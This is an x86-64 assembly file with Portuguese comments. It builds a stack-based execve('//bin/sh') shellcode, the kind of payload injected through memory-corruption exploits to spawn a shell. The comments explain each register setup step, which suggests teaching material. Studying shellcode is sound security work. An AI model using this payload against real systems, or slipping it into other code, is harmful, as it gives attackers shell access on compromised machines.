[BITS 64]
global _start
section .text
_start:
    ; Configuracao de arg1 (pathname) = "//bin/sh"
    xor rax, rax        ; Limpa RAX
    push rax            ; Insere o delimitador NULL da string na pilha
    mov rbx, '//bin/sh' ; Carrega a constante imediata de 8 bytes em RBX
    push rbx            ; Empilha a string literal
    mov rdi, rsp        ; RDI aponta para o endereco inicial da string
    ; Configuracao de arg2 (argv[]) = { "//bin/sh", NULL }
    push rax            ; argv[1] = NULL
    push rdi            ; argv[0] = Ponteiro para o pathname
    mov rsi, rsp        ; RSI aponta para a matriz de argumentos
    ; Configuracao de arg3 (envp) = NULL
    xor rdx, rdx        ; RDX assume 0 (vetor de ambiente nulo)
    ; Invocacao da Chamada de Sistema
    mov rax, 59         ; Carrega o identificador __NR_execve
    syscall             ; Transfere o controle de execucao ao Kernel
